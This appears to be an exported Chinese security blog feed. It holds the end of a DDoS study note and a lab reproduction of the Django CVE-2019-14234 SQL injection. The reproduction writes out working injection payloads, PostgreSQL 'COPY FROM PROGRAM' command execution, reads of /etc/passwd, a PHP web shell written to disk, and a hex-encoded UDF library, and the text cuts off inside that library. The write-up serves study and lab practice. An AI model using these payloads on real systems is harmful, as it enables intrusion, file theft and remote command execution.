<h3 id="Slow-Read-Attack"><a href="#Slow-Read-Attack" class="headerlink" title="Slow Read Attack"></a>Slow Read Attack</h3><p>æ”»å‡»è€…å‘é€ä¸€ä¸ªå®Œæ•´çš„HTTPæ•°æ®è¯·æ±‚ï¼Œä¹‹åæœåŠ¡å™¨ä¼šç»™å‡ºå“åº”ï¼Œè¿™æ—¶æ”»å‡»è€…åœ¨å°†è‡ªå·±çš„TCPçª—å£å¤§å°è®¾ç½®çš„å¾ˆå°ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®å®¢æˆ·çš„TCPçª—å£å¤§å°æ¥ä¼ é€æ•°æ®ã€‚</p>
<p>ç”±äºå®¢æˆ·ç«¯çš„TCPçª—å£å¾ˆå°ï¼ŒæœåŠ¡å™¨åªèƒ½ç¼“æ…¢çš„ä¼ è¾“æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚å½“å»ºç«‹å¤§é‡çš„è¿™ç§è¿æ¥æ—¶ï¼Œwebåº”ç”¨çš„å¹¶å‘è¿æ¥æ± å°†è¢«è€—å°½ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" data-fancybox="group" data-caption="ddos_23" class="fancybox"><img alt="ddos_23" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" class="lazyload" title="ddos_23"></a></p>
<h3 id="Apache-range-header-Attack"><a href="#Apache-range-header-Attack" class="headerlink" title="Apache range header Attack"></a>Apache range header Attack</h3><p>è¿™ç§æ”»å‡»æ–¹å¼åªé’ˆå¯¹ <code>Apache</code>ï¼Œå½“å®¢æˆ·ç«¯ä¼ è¾“å¤§æ–‡ä»¶æ—¶ä¼šæœ‰ <code>rangeå­—æ®µ</code>ï¼Œè¡¨ç¤ºå°†å¤§æ–‡ä»¶åˆ†æ®µï¼Œåˆ†æˆå‡ ä¸ªå°æ®µè¿›è¡Œä¼ è¾“ã€‚<br>ä¾‹å¦‚æ”»å‡»è€…å°†ä¸€ä¸ªæ–‡ä»¶æŒ‰ç…§ä¸€ä¸ªå­—èŠ‚ä¸€æ®µï¼Œåˆ†æˆå¥½å¤šæ®µï¼Œè¿™æ ·å°±ä¼šé€ æˆä¼ è¾“æ•°æ®ç¼“æ…¢ï¼Œé•¿æ—¶é—´å ç”¨è¿æ¥ï¼Œæ¶ˆè€—æœåŠ¡å™¨CPUå’Œå†…å­˜èµ„æºã€‚</p>
<h3 id="è¯´ä¸€ä¸‹-Apache-çš„é˜²æŠ¤"><a href="#è¯´ä¸€ä¸‹-Apache-çš„é˜²æŠ¤" class="headerlink" title="è¯´ä¸€ä¸‹ Apache çš„é˜²æŠ¤"></a>è¯´ä¸€ä¸‹ Apache çš„é˜²æŠ¤</h3><ul>
<li><strong><font color="6495ED">mod_reqtimeout :</font></strong> æ§åˆ¶è¯·æ±‚æ•°æ®ä¼ è¾“çš„è¶…æ—¶æ—¶é—´åŠæœ€å°é€Ÿç‡</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" data-fancybox="group" data-caption="ddos_24" class="fancybox"><img alt="ddos_24" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" class="lazyload" title="ddos_24"></a></p>
<ul>
<li><strong><font color="6495ED">mod_qos :</font></strong> Apacheçš„ä¸€ä¸ªæœåŠ¡è´¨é‡æ§åˆ¶æ¨¡å—ï¼Œç”¨æˆ·å¯é…ç½®å„ç§ä¸åŒé˜ˆå€¼</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" data-fancybox="group" data-caption="ddos_25" class="fancybox"><img alt="ddos_25" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" class="lazyload" title="ddos_25"></a></p>
<ul>
<li><strong><font color="6495ED">mod_security :</font></strong> ä¸€ä¸ªå¼€æºçš„WAFæ¨¡å—ï¼Œæœ‰ä¸“é—¨é’ˆå¯¹æ…¢é€Ÿæ”»å‡»é˜²æŠ¤çš„è§„åˆ™</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" data-fancybox="group" data-caption="ddos_26" class="fancybox"><img alt="ddos_26" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" class="lazyload" title="ddos_26"></a></p>
<p>å…¶ä»–çš„ä¸­é—´ä»¶é˜²æŠ¤æ–¹æ¡ˆï¼Œå‚è€ƒä¸‹é¢çš„é“¾æ¥</p>
<hr>
<h2 id="XSS-DOS-ï¼ˆç¨ä½œäº†è§£"><a href="#XSS-DOS-ï¼ˆç¨ä½œäº†è§£" class="headerlink" title="XSS-DOS ï¼ˆç¨ä½œäº†è§£"></a>XSS-DOS ï¼ˆç¨ä½œäº†è§£</h2><p>åˆ©ç”¨ç½‘ç«™å­˜åœ¨çš„ <code>å­˜å‚¨å‹XXSæ¼æ´</code>ï¼Œåœ¨ç½‘ç«™ä¸­æ’å…¥æ¶æ„çš„jsä»£ç ã€‚<strong><font color="6495ED">ä»£ç çš„åŠŸèƒ½æ˜¯ä¸æ–­å‘webæœåŠ¡å™¨å‘èµ·å¤§é‡è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æœåŠ¡å™¨å®•æœºï¼Œæ— æ³•å“åº”æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ã€‚</font></strong></p>
<p>å®¢æˆ·ç«¯è®¿é—®å·²æ’å…¥æ¶æ„çš„javascriptä»£ç çš„é¡µé¢åï¼Œæµé‡å¦‚ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" data-fancybox="group" data-caption="ddos_27" class="fancybox"><img alt="ddos_27" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" class="lazyload" title="ddos_27"></a></p>
<p>ç”±äºè¿™ç§æ”»å‡»çš„æ˜¯ç”± <code>å­˜å‚¨å‹XSS</code>å¯¼è‡´çš„ï¼Œå› æ­¤è¦è€ƒè™‘å¦‚ä½•é˜²æŠ¤ <code>å­˜å‚¨å‹XSS</code>ã€‚</p>
<p><strong>é˜²æŠ¤æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>å¯¹ç”¨æˆ·çš„è¾“å…¥ä»¥åŠurlå‚æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼›</li>
<li>å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œç¼–ç è½¬æ¢ï¼›</li>
<li>ç»“åˆé»‘ç™½åå•æœºåˆ¶ã€‚</li>
</ul>
<h2 id="æ—¶é—´é€é•œæ”»å‡»"><a href="#æ—¶é—´é€é•œæ”»å‡»" class="headerlink" title="æ—¶é—´é€é•œæ”»å‡»"></a>æ—¶é—´é€é•œæ”»å‡»</h2><p>é€šè¿‡æ§åˆ¶ç›¸åŒæºå’Œç›¸åŒç›®çš„IPæŠ¥æ–‡ï¼Œä½¿å¾—èµ°ä¸åŒè·¯å¾„çš„æ•°æ®åŒ…ï¼Œåœ¨åŒä¸€æ—¶åˆ»åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨ï¼Œä»è€Œè¾¾åˆ°æµé‡é›†ä¸­æ”»å‡»çš„ç›®çš„ã€‚</p>
<p>è¿™ç§æ”»å‡»å…¶å®æˆ‘ä¹Ÿè¿˜å¼„ä¸å¤ªæ‡‚ï¼Œè¯¦ç»†ä¿¡æ¯å¯ä»¥é˜…è¯»è¿™ç¯‡paperï¼š<a href="http://icir.org/vern/papers/lensing.oak15.pdf" target="_blank" rel="noopener">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>ï¼Œä»¥åŠåé¢çš„å‚è€ƒé“¾æ¥</p>
<h3 id="æ”»å‡»ç¤ºæ„å›¾"><a href="#æ”»å‡»ç¤ºæ„å›¾" class="headerlink" title="æ”»å‡»ç¤ºæ„å›¾"></a>æ”»å‡»ç¤ºæ„å›¾</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" data-fancybox="group" data-caption="ddos_28" class="fancybox"><img alt="ddos_28" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" class="lazyload" title="ddos_28"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" data-fancybox="group" data-caption="ddos_29" class="fancybox"><img alt="ddos_29" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" class="lazyload" title="ddos_29"></a></p>
<p>ä¸»è¦æ‰¯ä¸€ä¸‹é˜²æŠ¤æ–¹æ¡ˆï¼šå¢åŠ æŠ–åŠ¨ï¼Œå¹²æ‰°æ”»å‡»è·¯å¾„ï¼Œä½¿å¾—æ•°æ®åŒ…æ— æ³•é¢„æœŸåˆ°è¾¾ï¼›ç”±è¿è¥å•†ç¦æ­¢æºè·¯ç”±ã€‚<br>å…¶ä»–é˜²å¾¡æªæ–½ï¼š</p>
<ul>
<li>é‡‡ç”¨é«˜æ€§èƒ½çš„ç½‘ç»œè®¾å¤‡ï¼›å……è¶³çš„ç½‘ç»œå¸¦å®½ä¿è¯ï¼›å‡çº§ä¸»æœºæœåŠ¡å™¨ç¡¬ä»¶ï¼›</li>
<li><strong>é¿å…å°†æœåŠ¡å™¨çš„çœŸå®IPæš´éœ²åœ¨å…¬ç½‘ä¸­</strong>ï¼›</li>
<li>ä½¿ç”¨CDNå¯¹æµé‡è¿›è¡Œç¨€é‡Šï¼Œå½“å¤§æµé‡ç¨€é‡Šåˆ°å„ä¸ªCDNèŠ‚ç‚¹æ—¶ï¼Œå†å¯¹æµé‡è¿›è¡Œæ¸…æ´—ï¼Œä»è€Œè¾¾åˆ°é˜²æŠ¤æºç«™çš„ç›®çš„ã€‚ç„¶è€Œè¿™ç§é˜²å¾¡æ–¹å¼åªèƒ½ç”¨åœ¨å¯¹åŸŸåå‘èµ·çš„DDOSæ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…ç›´æ¥å¯¹IPè¿›è¡Œæ”»å‡»ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>anycastæŠ€æœ¯</code> æ¥é˜²å¾¡ã€‚</li>
</ul>
<hr>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://kb.mazebolt.com/knowledgebase/ack-flood/" target="_blank" rel="noopener">ack flood</a><br><a href="https://zhidao.baidu.com/question/1429836881297848579.html" target="_blank" rel="noopener">DDoSå’Œccçš„åŒºåˆ«</a><br><a href="https://www.jianshu.com/p/dff5a0d537d8" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯ccæ”»å‡»</a><br><a href="https://www.imperva.com/learn/application-security/" target="_blank" rel="noopener">DDoSçš„å¤§éƒ¨åˆ†æ”»å‡»å½¢å¼</a><br><a href="https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/" target="_blank" rel="noopener">Mitigate Slow HTTP GET/POST Vulnerabilities in the Apache HTTP Server</a><br><a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" target="_blank" rel="noopener">How to Protect Against Slow HTTP Attacks</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&mid=2247483685&idx=1&sn=8ac38ff22d571bbbf7716cb9e83b9b35&chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&mpshare=1&scene=23&srcid=0831Wr5YJPYzSrQU6gnfGVd0" target="_blank" rel="noopener">æ—¶é—´é€é•œåŠå…¶åœ¨è„‰å†²æ‹’ç»æœåŠ¡æ”»å‡»çš„åº”ç”¨</a><br>ã€Šç ´åä¹‹ç‹_DDoSæ”»å‡»ä¸é˜²èŒƒæ·±åº¦å‰–æã€‹(ä¹¦ç±ç½‘ä¸Šæœ‰ç”µå­æ¡£)</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-14234 å¤ç°æŒ–å‘</title>
    <url>/yakko117/2020/02/18/CVE_2019_14234/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>åœ¨ <code>Django 1.11.x</code>ï¼ˆ1.11.23ä¹‹å‰ï¼‰ï¼Œ2.1.xï¼ˆ2.1.11ä¹‹å‰ï¼‰å’Œ2.2.xï¼ˆ2.2.4ä¹‹å‰ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªé—®é¢˜ã€‚ ç”±äº<code>shallow key</code>è½¬æ¢ä¸­çš„é”™è¯¯ï¼Œ<code>django.contrib.postgres.fields.JSONField</code> çš„å…³é”®å­—å’Œç´¢å¼•æŸ¥æ‰¾ä»¥åŠ <code>django.contrib.postgres.fields.HStoreField</code> çš„å…³é”®å­—æŸ¥æ‰¾å—åˆ°SQLæ³¨å…¥ã€‚ </p>
<a id="more"></a>

<p>ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡åœ¨ <code>key</code> æˆ–ç´¢å¼•åç§°ä¸­ä½¿ç”¨ <code>OR 1 = 1</code>æ¥åˆ©ç”¨æ¼æ´ï¼Œä½¿ç”¨ç‰¹åˆ¶çš„å­—å…¸å¹¶é€šè¿‡å­—å…¸æ‰©å±•å°†æ‰€æœ‰è®°å½•è¿”å›ç»™<code>** kwarg</code>ï¼Œä»¥å°†æ‰€æœ‰è®°å½•è¿”å›ç»™ <code>QuerySet.filter()</code> åŠŸèƒ½ã€‚</p>
<h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>é¦–å…ˆå…ˆæ¥çœ‹ä¸€ä¸‹å®˜æ–¹çš„ä¿®å¤æªæ–½<br><a href="https://github.com/django/django/pull/11612/files" target="_blank" rel="noopener">Fixed #30664</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨ <code>django/db/backends/postgresql/schema.py</code> ä¸­ï¼Œåˆ©ç”¨ <code>strip_quotes()</code> å‡½æ•°å°è£…ï¼Œå°†ä¼ é€’çš„å­—ç¬¦ä¸²ä¸­çš„ <code>&#39; (å¼•å·)</code> åˆ é™¤ï¼Œè¿”å›ç§»é™¤å­—ç¬¦ä¸²å¤´å°¾æŒ‡å®šçš„å­—ç¬¦ç”Ÿæˆçš„æ–°å­—ç¬¦ä¸²ï¼Œè¿›è¡Œä¼ å‚ã€‚</p>
<hr>
<p><a href="https://github.com/django/django/pull/11784/files" target="_blank" rel="noopener">Fixed #30769</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°† <code>django/contrib/postgres/fields/hstore.py</code> æ–‡ä»¶é‡Œé¢çš„ <code>KeyTransformç±»</code>çš„ <code>as_sql</code> å‡½æ•°ä¸­çš„ç›´æ¥ä¼ é€’å­—ç¬¦ä¸²æ”¹ä¸ºäº†å°† <code>self.key_name</code> å•ç‹¬ä½¿ç”¨æ•°ç»„è¿›è¡Œä¼ é€’,å…¶ä¸­ <code>%%</code> çš„æ„æ€ä¸º <code>è½¬æ¢è¯´æ˜ç¬¦</code>ï¼Œå…¶ä¸»è¦ä½œç”¨ä¸ºç›´æ¥è½¬åŒ–ä¸ºå•ä¸ª <code>%</code> ç¬¦å·è€Œä¸éœ€è¦å‚æ•°ã€‚ç±»ä¼¼äº <code>\\</code> å’Œ <code>\</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In[1]: "%%"%()</span><br><span class="line">Out[1]: '%'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</span></span><br><span class="line"></span><br><span class="line">In [2]: '%s %%s'%'test'</span><br><span class="line">Out[2]: 'test %s'</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å†çœ‹ä¸‹ä¸€ä¸ª"><a href="#å†çœ‹ä¸‹ä¸€ä¸ª" class="headerlink" title="å†çœ‹ä¸‹ä¸€ä¸ª"></a>å†çœ‹ä¸‹ä¸€ä¸ª</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨ <code>django/contrib/postgres/fields/jsonb.py</code> æ–‡ä»¶ä¸­å°†å¯¹ <code>self.key_name</code> å˜é‡çš„è¿”å›ç»Ÿä¸€æ”¹æˆäº†ä½¿ç”¨æ•°ç»„è¿›è¡Œè½¬æ¢ã€‚å¹¶ä¸”åæœŸåœ¨å•å…ƒæµ‹è¯•ä¸­åŠ å…¥äº†å¯¹ <code>JSONField</code>çš„SQLæ³¨å…¥æµ‹è¯•</p>
<hr>
<h1 id="é¶åœºå¤ç°"><a href="#é¶åœºå¤ç°" class="headerlink" title="é¶åœºå¤ç°"></a>é¶åœºå¤ç°</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794" target="_blank" rel="noopener">pç¥æµæ‰¹ï¼</a></p>
<p>è¿›å…¥ <code>http://ip:port/admin/vuln/collection/</code><br>ä¼ å‚ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?detail__a%27b&#x3D;1</span><br></pre></td></tr></table></figure></div>
<p>ä¼šæ˜¾ç¤ºå°† <code>&#39;</code> åŒ…æ‹¬è¿›å»</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" class="lazyload" title="test"></a></p>
<p>è¯´æ˜å¯ä»¥æ„å»ºæŸ¥è¯¢å­—æ®µ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id_contains&#x3D;admin</span><br><span class="line">name_contains&#x3D;admin</span><br><span class="line">flag_contains&#x3D;flag&#123;</span><br><span class="line"></span><br><span class="line">?detail__author&#39;+&#x3D;+&#39;&quot;a&quot;&#39;)--</span><br><span class="line">?detail__author%27+%3d+%27&quot;a&quot;%27)%20and%207778%3dCAST((SELECT%20version())%20AS%20NUMERIC)--</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 %3bCREATE table cmd_exec(cmd_output text) -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output <span class="built_in">text</span>);</span><br><span class="line">COPY cmd_exec FROM PROGRAM 'id';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure></div>

<h2 id="åˆ‡å‰²è„šæœ¬"><a href="#åˆ‡å‰²è„šæœ¬" class="headerlink" title="åˆ‡å‰²è„šæœ¬"></a>åˆ‡å‰²è„šæœ¬</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage:python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">"inputfile"</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        sys.stdout.write(<span class="string">r'&#123;:02x&#125;'</span>.format(ord(b)))</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2048</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure></div>

<p><code>PostgreSQL</code> æ˜¯ä¸€ä¸ªè‡ªç”±çš„å¯¹è±¡-å…³ç³»æ•°æ®åº“æœåŠ¡å™¨(æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ)</p>
<h2 id="åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç "><a href="#åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç " class="headerlink" title="åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç "></a>åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç </h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service postgresql start	//å¯åŠ¨æœåŠ¡</span><br><span class="line">su postgres	<span class="comment">#åˆ‡æ¢åˆ°æ•°æ®åº“ç”¨æˆ·ä¸‹</span></span><br><span class="line">psql  postgres	<span class="comment">#è¿›å…¥æ•°æ®åº“</span></span><br><span class="line">alter user postgres with password <span class="string">'postgres'</span> <span class="comment">#ä¿®æ”¹æ•°æ®åº“çš„å¯†ç ä¸ºï¼špostgres</span></span><br><span class="line">psql -h 127.0.0.1 -U postgres -W   ä½¿ç”¨å¸å·å¯†ç ç™»å…¥ç³»ç»Ÿ</span><br></pre></td></tr></table></figure></div>

<h2 id="æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯"><a href="#æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯"></a>æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\l  <span class="comment">#åˆ—å‡ºæ•°æ®åº“</span></span><br><span class="line">\du  <span class="comment">#åˆ—å‡ºæ•°æ®åº“çš„ç”¨æˆ·</span></span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">'./'</span>);  <span class="comment">#åˆ—å‡ºç³»ç»Ÿç›®å½•åˆ—è¡¨(ä¸èƒ½æ˜¯ç»å¯¹è·¯å¾„)</span></span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">'postgresql.auto.conf'</span>, <span class="number">0</span>, <span class="number">200</span>);  <span class="comment">#è¯»å–ç³»ç»Ÿæ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯"><a href="#ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯"></a>ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn(t <span class="built_in">TEXT</span>);</span><br><span class="line">copy pwn from '/etc/passwd';</span><br><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> pwn <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br></pre></td></tr></table></figure></div>

<h2 id="ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶"><a href="#ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶"></a>ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn (t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pwn(t) <span class="keyword">values</span> (<span class="string">'&lt;?php @system("$_GET[cmd]");?&gt;'</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pwn;</span><br><span class="line">copy pwn(t) to  '/tmp/cmd.php';</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">copy  (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦ç”¨åˆ° <code>udfåº“</code>ï¼Œ(è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼mysql ææƒ)<br>åˆ›å»º <code>.so</code>ï¼Œæ‰§è¡Œè‡ªå·±éœ€è¦ç”¨çš„å‘½ä»¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4602010100000000000000000003003e0001000000d00d0000000000004000000000000000f82e0000000000000000000040003800070040001d001a000100000005000000000000000000000000000000000000000000000000000000fc16000000000000fc1600000000000000002000000000000100000006000000001e000000000000001e200000000000001e200000000000e002000000000000e80200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000ec14000000000000ec14000000000000ec140000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e57464040000000